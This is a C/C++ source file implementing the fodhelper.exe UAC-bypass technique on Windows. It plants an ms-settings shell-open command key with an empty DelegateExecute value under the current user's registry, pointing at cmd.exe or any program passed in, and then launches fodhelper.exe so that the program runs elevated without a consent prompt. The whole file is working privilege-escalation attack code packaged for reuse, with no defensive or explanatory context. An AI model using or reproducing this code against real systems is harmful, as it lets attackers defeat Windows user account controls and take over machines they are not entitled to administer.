#include "pch.h"
#include "FodHelperAbuseEscalationUtils.h"

#include <shellapi.h>
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <wchar.h>

#pragma comment(lib, "Advapi32.lib")

int FodHelperAbuseEscalationInternal(const char* execPath) {
    HKEY hkey;
    DWORD d;
    const char* settings = "Software\\Classes\\ms-settings\\Shell\\Open\\command";
    const char* defaultExec = "C:\\Windows\\System32\\cmd.exe";
    const char* target = (execPath != NULL && execPath[0] != '\0') ? execPath : defaultExec;
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "cmd /c start %s", target);
    const char* del = "";

    LSTATUS stat = RegCreateKeyExA(HKEY_CURRENT_USER, settings, 0, NULL, 0, KEY_WRITE, NULL, &hkey, &d);
    printf(stat != ERROR_SUCCESS ? "FAILED TO OPEN OR CREATE REG KEY\n" : "succesfully created reg key\n");

    stat = RegSetValueExA(hkey, NULL, 0, REG_SZ, (const BYTE*)cmd, (DWORD)strlen(cmd) + 1);
    printf(stat != ERROR_SUCCESS ? "FAILED TO SET REG VALUE\n" : "succesfully set reg value\n");

    stat = RegSetValueExA(hkey, "DelegateExecute", 0, REG_SZ, (const BYTE*)del, (DWORD)strlen(del) + 1);
    printf(stat != ERROR_SUCCESS ? "FAILED TO SET REG VALUE\n" : "succesfully set reg value\n");

    RegCloseKey(hkey);

    SHELLEXECUTEINFO shellExecuteInfo = { sizeof(shellExecuteInfo) };
    shellExecuteInfo.cbSize = sizeof(shellExecuteInfo);
    shellExecuteInfo.lpVerb = L"runas";
    shellExecuteInfo.lpFile = L"C:\\Windows\\System32\\fodhelper.exe";
    shellExecuteInfo.hwnd = NULL;
    shellExecuteInfo.nShow = SW_NORMAL;

    if (!ShellExecuteEx(&shellExecuteInfo)) {
        DWORD error = GetLastError();
        printf(error == ERROR_CANCELLED ? "The user refused to allow privilege elevation.\n" : "Unexpected error! Error code: %ld\n", error);
    }
    else {
        printf("Successfully created the process =^..^=\n");
    }

    return 0;
}